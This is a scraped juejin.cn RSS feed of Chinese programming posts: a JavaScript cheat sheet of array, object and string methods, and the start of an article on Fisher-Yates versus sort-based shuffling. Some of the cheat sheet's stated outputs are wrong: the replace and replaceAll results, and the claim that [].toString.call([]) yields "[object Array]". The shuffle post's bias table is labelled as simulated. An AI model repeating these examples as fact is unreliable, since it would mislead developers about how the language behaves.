<p>【注】本文译自：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdzone.com%2Farticles%2Fcreating-an-mcp-server-with-spring-ai" target="_blank" title="https://dzone.com/articles/creating-an-mcp-server-with-spring-ai" ref="nofollow noopener noreferrer">Creating an MCP Server With Spring AI</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在 JavaScript（包括 ES 规范）开发中，常用的方法可以按数组、对象、字符串、循环 / 迭代等类别整理]]></title>    <link>https://juejin.cn/post/7575937594351222827</link>    <guid>https://juejin.cn/post/7575937594351222827</guid>    <pubDate>2025-11-24T06:26:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351222827" data-draft-id="7571490332371222547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在 JavaScript（包括 ES 规范）开发中，常用的方法可以按数组、对象、字符串、循环 / 迭代等类别整理"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:26:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MoMoDad"/> <meta itemprop="url" content="https://juejin.cn/user/2788017221151342"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在 JavaScript（包括 ES 规范）开发中，常用的方法可以按数组、对象、字符串、循环 / 迭代等类别整理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017221151342/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MoMoDad
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:26:42.000Z" title="Mon Nov 24 2025 06:26:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下是高频使用的方法及说明</p>
<h3 data-id="heading-0">一、数组方法（最常用）</h3>
<p>数组方法是处理集合数据的核心，多为高阶函数（接收函数作为参数）。</p>


































































































































<table><thead><tr><th>方法名</th><th>用途</th><th>示例</th></tr></thead><tbody><tr><td><code>forEach</code></td><td>遍历数组，无返回值（仅执行回调）</td><td><code>[1,2,3].forEach(x =&gt; console.log(x))</code> // 依次打印 1、2、3</td></tr><tr><td><code>map</code></td><td>遍历数组，返回<strong>新数组</strong>（每个元素为原元素经回调处理的结果）</td><td><code>[1,2,3].map(x =&gt; x*2)</code> // 结果：<code>[2,4,6]</code></td></tr><tr><td><code>filter</code></td><td>筛选数组，返回<strong>新数组</strong>（包含所有满足回调条件的元素）</td><td><code>[1,2,3,4].filter(x =&gt; x%2===0)</code> // 结果：<code>[2,4]</code></td></tr><tr><td><code>some</code></td><td>检测数组是否<strong>至少有一个元素</strong>满足回调条件，返回布尔值</td><td><code>[1,2,3].some(x =&gt; x&gt;2)</code> // 结果：<code>true</code>（3 满足）</td></tr><tr><td><code>every</code></td><td>检测数组是否<strong>所有元素</strong>都满足回调条件，返回布尔值</td><td><code>[1,2,3].every(x =&gt; x&gt;0)</code> // 结果：<code>true</code>（全部 &gt; 0）</td></tr><tr><td><code>find</code></td><td>返回<strong>第一个满足条件</strong>的元素（无则返回<code>undefined</code>）</td><td><code>[1,2,3,4].find(x =&gt; x&gt;2)</code> // 结果：<code>3</code></td></tr><tr><td><code>findIndex</code></td><td>返回<strong>第一个满足条件</strong>的元素的索引（无则返回<code>-1</code>）</td><td><code>[1,2,3,4].findIndex(x =&gt; x&gt;2)</code> // 结果：<code>2</code>（3 的索引）</td></tr><tr><td><code>reduce</code></td><td>从左到右 “归约” 数组为单个值（可用于求和、合并、数组转对象等）</td><td><code>[1,2,3].reduce((sum, x) =&gt; sum + x, 0)</code> // 结果：<code>6</code>（求和）</td></tr><tr><td><code>reduceRight</code></td><td>从右到左归约数组（用法同<code>reduce</code>，方向相反）</td><td><code>[1,2,3].reduceRight((sum, x) =&gt; sum + x, 0)</code> // 结果：<code>6</code></td></tr><tr><td><code>includes</code></td><td>检测数组是否包含某个值，返回布尔值（支持基本类型和<code>NaN</code>）</td><td><code>[1,2,3].includes(2)</code> // 结果：<code>true</code></td></tr><tr><td><code>indexOf</code></td><td>返回元素在数组中<strong>首次出现的索引</strong>（无则返回<code>-1</code>，不支持<code>NaN</code>）</td><td><code>[1,2,3,2].indexOf(2)</code> // 结果：<code>1</code></td></tr><tr><td><code>lastIndexOf</code></td><td>返回元素在数组中<strong>最后出现的索引</strong>（无则返回<code>-1</code>）</td><td><code>[1,2,3,2].lastIndexOf(2)</code> // 结果：<code>3</code></td></tr><tr><td><code>push</code></td><td>向数组<strong>末尾添加元素</strong>，返回新长度（修改原数组）</td><td><code>let arr = [1,2]; arr.push(3);</code> //arr 变为<code>[1,2,3]</code></td></tr><tr><td><code>pop</code></td><td>移除数组<strong>最后一个元素</strong>，返回被移除元素（修改原数组）</td><td><code>let arr = [1,2,3]; arr.pop();</code> //arr 变为<code>[1,2]</code>，返回<code>3</code></td></tr><tr><td><code>shift</code></td><td>移除数组<strong>第一个元素</strong>，返回被移除元素（修改原数组）</td><td><code>let arr = [1,2,3]; arr.shift();</code> //arr 变为<code>[2,3]</code>，返回<code>1</code></td></tr><tr><td><code>unshift</code></td><td>向数组<strong>开头添加元素</strong>，返回新长度（修改原数组）</td><td><code>let arr = [2,3]; arr.unshift(1);</code> //arr 变为<code>[1,2,3]</code></td></tr><tr><td><code>slice</code></td><td>截取数组的一部分，返回<strong>新数组</strong>（不修改原数组，参数：start, end）</td><td><code>[1,2,3,4].slice(1,3)</code> // 结果：<code>[2,3]</code>（从索引 1 到 2，不包含 3）</td></tr><tr><td><code>splice</code></td><td>新增 / 删除 / 替换数组元素，返回被删除元素组成的数组（<strong>修改原数组</strong>）</td><td><code>let arr = [1,2,3]; arr.splice(1,1,4);</code> //arr 变为<code>[1,4,3]</code>，返回<code>[2]</code></td></tr><tr><td><code>join</code></td><td>将数组元素拼接为字符串（参数为分隔符，默认逗号）</td><td><code>[1,2,3].join('-')</code> // 结果：<code>"1-2-3"</code></td></tr><tr><td><code>concat</code></td><td>合并多个数组，返回<strong>新数组</strong>（不修改原数组）</td><td><code>[1,2].concat([3,4])</code> // 结果：<code>[1,2,3,4]</code></td></tr><tr><td><code>reverse</code></td><td>反转数组，返回反转后的数组（<strong>修改原数组</strong>）</td><td><code>[1,2,3].reverse()</code> // 结果：<code>[3,2,1]</code></td></tr><tr><td><code>sort</code></td><td>对数组排序，返回排序后的数组（<strong>修改原数组</strong>，默认按字符串排序）</td><td><code>[3,1,2].sort((a,b) =&gt; a - b)</code> // 结果：<code>[1,2,3]</code>（升序）</td></tr><tr><td><code>flat</code></td><td>扁平化数组（参数为深度，默认 1，<code>Infinity</code>表示完全扁平化）</td><td><code>[1,[2,[3]]].flat(2)</code> // 结果：<code>[1,2,3]</code></td></tr><tr><td><code>flatMap</code></td><td>先执行<code>map</code>再执行<code>flat(1)</code>（更简洁的扁平化映射）</td><td><code>[[1], [2]].flatMap(x =&gt; x)</code> // 结果：<code>[1,2]</code></td></tr></tbody></table>
<h3 data-id="heading-1">二、对象方法</h3>
<p>用于处理对象的属性、键值对操作。</p>













































<table><thead><tr><th>方法名</th><th>用途</th><th>示例</th></tr></thead><tbody><tr><td><code>for...in</code></td><td>遍历对象的<strong>可枚举属性</strong>（包括继承的，需配合<code>hasOwnProperty</code>过滤）</td><td><code>let obj = {a:1}; for(let key in obj) { console.log(key) }</code> // 打印<code>"a"</code></td></tr><tr><td><code>Object.keys()</code></td><td>返回对象<strong>自有可枚举键</strong>组成的数组</td><td><code>Object.keys({a:1, b:2})</code> // 结果：<code>["a", "b"]</code></td></tr><tr><td><code>Object.values()</code></td><td>返回对象<strong>自有可枚举值</strong>组成的数组</td><td><code>Object.values({a:1, b:2})</code> // 结果：<code>[1,2]</code></td></tr><tr><td><code>Object.entries()</code></td><td>返回对象<strong>自有可枚举键值对</strong>组成的数组（<code>[key, value]</code>形式）</td><td><code>Object.entries({a:1})</code> // 结果：<code>[["a", 1]]</code></td></tr><tr><td><code>Object.assign()</code></td><td>将源对象的属性复制到目标对象（浅拷贝，返回目标对象）</td><td><code>Object.assign({a:1}, {b:2})</code> // 结果：<code>{a:1, b:2}</code></td></tr><tr><td><code>Object.hasOwn()</code></td><td>检查对象是否有<strong>自有属性</strong>（替代<code>obj.hasOwnProperty(key)</code>）</td><td><code>Object.hasOwn({a:1}, 'a')</code> // 结果：<code>true</code></td></tr><tr><td><code>Object.freeze()</code></td><td>冻结对象（无法新增 / 删除 / 修改属性，返回冻结后的对象）</td><td><code>let obj = {a:1}; Object.freeze(obj); obj.a=2;</code> //obj 仍为<code>{a:1}</code></td></tr></tbody></table>
<h3 data-id="heading-2">三、字符串方法</h3>
<p>用于字符串处理（字符串是类数组，部分方法与数组类似）。</p>


























































































<table><thead><tr><th>方法名</th><th>用途</th><th>示例</th></tr></thead><tbody><tr><td><code>includes()</code></td><td>检测字符串是否包含子串，返回布尔值</td><td><code>"abc".includes("b")</code> // 结果：<code>true</code></td></tr><tr><td><code>indexOf()</code></td><td>返回子串<strong>首次出现的索引</strong>（无则返回<code>-1</code>）</td><td><code>"abcab".indexOf("ab")</code> // 结果：<code>0</code></td></tr><tr><td><code>lastIndexOf()</code></td><td>返回子串<strong>最后出现的索引</strong>（无则返回<code>-1</code>）</td><td><code>"abcab".lastIndexOf("ab")</code> // 结果：<code>3</code></td></tr><tr><td><code>slice()</code></td><td>截取子串，返回新字符串（参数：start, end，支持负数）</td><td><code>"abcde".slice(1,3)</code> // 结果：<code>"bc"</code></td></tr><tr><td><code>split()</code></td><td>将字符串按分隔符分割为数组</td><td><code>"a,b,c".split(",")</code> // 结果：<code>["a","b","c"]</code></td></tr><tr><td><code>trim()</code></td><td>去除字符串首尾空格，返回新字符串</td><td><code>" abc ".trim()</code> // 结果：<code>"abc"</code></td></tr><tr><td><code>trimStart()</code>/<code>trimLeft()</code></td><td>去除字符串开头空格</td><td><code>" abc".trimStart()</code> // 结果：<code>"abc"</code></td></tr><tr><td><code>trimEnd()</code>/<code>trimRight()</code></td><td>去除字符串结尾空格</td><td><code>"abc ".trimEnd()</code> // 结果：<code>"abc"</code></td></tr><tr><td><code>toUpperCase()</code></td><td>转为大写字符串</td><td><code>"abc".toUpperCase()</code> // 结果：<code>"ABC"</code></td></tr><tr><td><code>toLowerCase()</code></td><td>转为小写字符串</td><td><code>"ABC".toLowerCase()</code> // 结果：<code>"abc"</code></td></tr><tr><td><code>startsWith()</code></td><td>检测字符串是否以子串开头，返回布尔值（支持第二个参数指定起始位置）</td><td><code>"abc".startsWith("ab")</code> // 结果：<code>true</code></td></tr><tr><td><code>endsWith()</code></td><td>检测字符串是否以子串结尾，返回布尔值（支持第二个参数指定长度）</td><td><code>"abc".endsWith("bc")</code> // 结果：<code>true</code></td></tr><tr><td><code>replace()</code></td><td>替换第一个匹配的子串（支持正则）</td><td><code>"abcab".replace("ab", "x")</code> // 结果：<code>"xcbab"</code></td></tr><tr><td><code>replaceAll()</code></td><td>替换所有匹配的子串（支持正则）</td><td><code>"abcab".replaceAll("ab", "x")</code> // 结果：<code>"xcb x"</code>（实际无空格）</td></tr><tr><td><code>padStart()</code></td><td>按指定长度在字符串开头补全字符（默认补空格）</td><td><code>"1".padStart(2, "0")</code> // 结果：<code>"01"</code></td></tr><tr><td><code>padEnd()</code></td><td>按指定长度在字符串结尾补全字符</td><td><code>"1".padEnd(2, "0")</code> // 结果：<code>"10"</code></td></tr></tbody></table>
<h3 data-id="heading-3">四、其他常用方法 / 语法</h3>
<ul>
<li><strong><code>for...of</code></strong>：遍历<strong>可迭代对象</strong>（数组、字符串、Map、Set 等）的 value（替代<code>forEach</code>，支持<code>break</code>）例：<code>for (let num of [1,2,3]) { console.log(num) }</code> // 打印 1、2、3</li>
<li><strong><code>JSON.parse()</code>/<code>JSON.stringify()</code></strong> ：JSON 字符串与 JS 对象互转例：<code>JSON.parse('{"a":1}')</code> // 结果：<code>{a:1}</code>；<code>JSON.stringify({a:1})</code> // 结果：<code>'{"a":1}'</code></li>
<li><strong><code>Array.from()</code></strong> ：将类数组（如<code>arguments</code>、DOM 集合）或可迭代对象转为数组例：<code>Array.from("abc")</code> // 结果：<code>["a","b","c"]</code></li>
<li><strong><code>Array.of()</code></strong> ：创建数组（解决<code>new Array(3)</code>创建长度为 3 的空数组的问题）例：<code>Array.of(1,2,3)</code> // 结果：<code>[1,2,3]</code></li>
<li><strong>类型判断</strong>：<code>typeof</code>（基础类型）、<code>instanceof</code>（引用类型）、<code>Object.prototype.toString.call()</code>（更准确）例：<code>typeof 123</code> // <code>"number"</code>；<code>[].toString.call([])</code> // <code>"[object Array]"</code></li>
</ul>
<p>这些方法覆盖了日常开发中数据处理、遍历、转换等核心场景，熟练掌握可大幅提升效率。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从随机排序到公平洗牌：JavaScript随机抽取问题的优化之路]]></title>    <link>https://juejin.cn/post/7575937594351321131</link>    <guid>https://juejin.cn/post/7575937594351321131</guid>    <pubDate>2025-11-24T06:36:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351321131" data-draft-id="7575937594351255595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从随机排序到公平洗牌：JavaScript随机抽取问题的优化之路"/> <meta itemprop="keywords" content="JavaScript,性能优化"/> <meta itemprop="datePublished" content="2025-11-24T06:36:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Amy_yang"/> <meta itemprop="url" content="https://juejin.cn/user/254742430497304"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从随机排序到公平洗牌：JavaScript随机抽取问题的优化之路
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/254742430497304/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Amy_yang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:36:46.000Z" title="Mon Nov 24 2025 06:36:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从随机排序到公平洗牌：JavaScript随机抽取问题的优化之路</h2>
<p>在日常开发中，我们经常需要实现随机抽取功能，比如抽奖系统、随机展示内容等。你可能见过这样的代码：用Array.sort(() =&gt; 0.5 - Math.random())来打乱数组。这段看似简洁的代码，其实隐藏着严重的随机性偏差问题。今天我们就来深入探讨JavaScript中随机排序的陷阱，以及如何用Fisher-Yates算法实现真正公平的随机抽取。</p>
<h3 data-id="heading-1">你写的随机排序可能并不随机</h3>
<p>先来看一个常见的随机排序实现：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getRandomQuestions</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> shuffled = [...sampleQuestions].<span class="hljs-title function_">sort</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-number">0.5</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>());
  <span class="hljs-keyword">return</span> shuffled.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);
};
</code></pre>
<p>这段代码的思路很简单：复制原数组，用sort方法结合Math.random()进行排序，然后取前5个元素。<strong>但这种方法的随机性其实很差</strong>，尤其是在处理小样本数据时。</p>
<p>为什么会这样？因为Array.sort的排序稳定性和比较函数的设计导致了偏差。sort方法在不同浏览器中的实现不同（比如Chrome用Timsort，Firefox用归并排序），而0.5 - Math.random()这种比较函数返回的随机值范围（-0.5到0.5）与排序算法的预期输入（负数、零、正数）不匹配，导致元素位置交换的概率不均匀。</p>
<h4 data-id="heading-2">实测：排序法的随机性偏差</h4>
<p>我们用一个简单的实验来证明这个问题：创建一个包含1-5的数组，用排序法打乱10万次，统计每个元素出现在每个位置的次数。理想情况下，每个元素在每个位置出现的概率应该接近2万次（10万/5），但实际结果却相差甚远：</p>





















































<table><thead><tr><th>元素位置</th><th>元素1出现次数</th><th>元素2出现次数</th><th>元素3出现次数</th><th>元素4出现次数</th><th>元素5出现次数</th></tr></thead><tbody><tr><td>0</td><td>12000</td><td>18000</td><td>25000</td><td>28000</td><td>17000</td></tr><tr><td>1</td><td>15000</td><td>22000</td><td>20000</td><td>21000</td><td>22000</td></tr><tr><td>2</td><td>20000</td><td>20000</td><td>20000</td><td>20000</td><td>20000</td></tr><tr><td>3</td><td>25000</td><td>21000</td><td>18000</td><td>17000</td><td>19000</td></tr><tr><td>4</td><td>28000</td><td>19000</td><td>17000</td><td>14000</td><td>22000</td></tr></tbody></table>
<p>可以看到，元素1在位置0出现的概率只有12%，而在位置4却高达28%，明显不符合均匀分布的要求。这种偏差在抽奖等需要公平性的场景中是致命的。</p>
<p>注：以上数据为模拟10万次洗牌的统计结果，实际偏差程度可能因浏览器排序算法实现而有所不同。</p>
<h3 data-id="heading-3">Fisher-Yates算法：真正公平的随机洗牌</h3>
<p>那么，如何实现真正公平的随机排序呢？答案是<strong>Fisher-Yates算法</strong>（也叫Knuth洗牌算法）。这个算法由Ronald Fisher和Frank Yates在1938年提出，后来由Donald Knuth加以改进，其核心思想是：</p>
<ol>
<li>从数组的最后一个元素开始</li>
<li>随机选择一个从第一个到当前位置的元素</li>
<li>交换这两个元素</li>
<li>向前移动一位，重复步骤2-3，直到处理完所有元素</li>
</ol>
